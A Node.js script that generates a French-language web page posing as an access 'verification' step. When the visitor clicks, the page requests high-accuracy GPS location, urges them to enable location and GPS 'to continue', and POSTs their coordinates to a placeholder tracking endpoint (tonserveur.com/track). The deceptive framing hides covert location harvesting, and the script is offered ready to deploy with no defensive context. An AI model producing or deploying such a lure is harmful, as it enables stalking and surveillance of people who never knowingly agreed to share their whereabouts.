const fs = require('fs');

const htmlContent = `
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification</title>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            } else {
                alert("La géolocalisation n'est pas supportée par ce navigateur.");
            }
        }

        function sendLocation(position) {
            if (position.coords.accuracy > 50) {
                alert("La précision de votre position est faible. Activez votre GPS pour une meilleure localisation.");
            }

            const data = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy
            };

            fetch('https://tonserveur.com/track', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => console.log("Données envoyées", data))
            .catch(error => console.error("Erreur", error));
        }

        function handleError(error) {
            if (error.code === error.PERMISSION_DENIED) {
                alert("Veuillez activer la localisation pour continuer.");
            } else if (error.code === error.POSITION_UNAVAILABLE) {
                alert("Position non disponible. Assurez-vous que le GPS est activé.");
            } else if (error.code === error.TIMEOUT) {
                alert("Temps dépassé. Essayez à nouveau.");
            } else {
                alert("Erreur de géolocalisation : " + error.message);
            }
        }
    </script>
</head>
<body>
    <h1>Vérification de l'accès...</h1>
    <button onclick="getLocation()">Obtenir ma position</button>
</body>
</html>
`;

fs.writeFileSync('index.html', htmlContent);
console.log("Le fichier index.html a été généré !");
